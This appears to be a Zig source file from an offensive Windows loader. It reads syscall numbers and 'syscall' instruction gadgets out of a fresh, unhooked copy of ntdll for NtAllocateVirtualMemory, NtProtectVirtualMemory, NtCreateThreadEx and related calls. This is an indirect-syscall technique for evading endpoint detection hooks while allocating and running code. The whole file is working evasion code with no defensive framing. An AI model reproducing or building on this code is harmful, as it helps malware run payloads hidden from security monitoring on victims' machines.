const std = @import("std");
const pe = @import("pe.zig");

pub const Entry = struct {
    number: u32,
    gadget: *anyopaque,
};

pub const Syscalls = struct {
    NtAllocateVirtualMemory: Entry,
    NtProtectVirtualMemory: Entry,
    NtCreateThreadEx: Entry,
    NtWaitForSingleObject: Entry,
    NtDelayExecution: Entry,

    pub fn resolve(fresh_ntdll: [*]u8) ?Syscalls {
        const names = [_][]const u8{
            "NtAllocateVirtualMemory",
            "NtProtectVirtualMemory",
            "NtCreateThreadEx",
            "NtWaitForSingleObject",
            "NtDelayExecution",
        };
        var result: Syscalls = undefined;
        inline for (names) |name| {
            const entry = extractEntry(fresh_ntdll, name) orelse {
                std.debug.print("syscall '{s}' not found\n", .{name});
                return null;
            };
            @field(result, name) = entry;
        }
        return result;
    }
};

fn extractEntry(fresh_ntdll: [*]u8, name: []const u8) ?Entry {
    const addr = pe.findExport(fresh_ntdll, name) orelse return null;
    const bytes = @as([*]u8, @ptrCast(addr));

    if (bytes[0] != 0x4C or bytes[1] != 0x8B or bytes[2] != 0xD1) return null;
    if (bytes[3] != 0xB8) return null;
    const number = std.mem.readInt(u32, bytes[4..8], .little);

    var gadget: ?*anyopaque = null;
    var i: usize = 0;
    while (i < 64) : (i += 1) {
        if (bytes[i] == 0x0F and bytes[i + 1] == 0x05) {
            gadget = @ptrFromInt(@intFromPtr(addr) + i);
            break;
        }
    }
    if (gadget == null) return null;

    return Entry{ .number = number, .gadget = gadget.? };
}
